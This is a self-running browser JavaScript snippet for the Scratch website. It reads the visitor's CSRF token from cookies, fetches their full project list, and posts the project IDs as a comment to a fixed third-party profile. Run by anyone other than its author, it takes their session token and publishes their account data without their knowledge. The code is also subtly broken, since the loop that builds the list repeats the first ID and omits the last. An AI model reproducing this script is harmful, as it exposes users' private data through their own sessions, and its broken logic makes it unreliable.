async function a(){
    let token="";
        {
            let cookie=document.cookie;
            cookie=cookie.split(';');
            let cok=[[],[]];
            cookie.forEach(function(element){
                const elements=element.split("=");
                cok[0].push(elements[0]);
                cok[1].push(elements[1]);
            });
            token=cok[1][cok[0].indexOf(' scratchcsrftoken')];
        }
    const res = await fetch(`https://scratch.mit.edu/site-api/projects/all/`);
    let json = await res.json();
    let ar=[];
    for(let i=0;i<json.length;i++){
      ar.push(json[i]["pk"]);
    }
    let contents=ar[0];
    for(let i=0;i<json.length-1;i++){
      contents+=","+ar[i];
    }
    contents="["+contents+"] ";
    contents+=` (${ar.length})`;
    fetch(`/site-api/comments/user/yamaguchi03/add/`,{
      method: "POST",
      body: JSON.stringify({
        content: contents,
        parent_id: "218400750",
        commentee_id: "62203658"
      }),
      headers: {
        'X-CSRFToken': token
      }
    });
}
a();
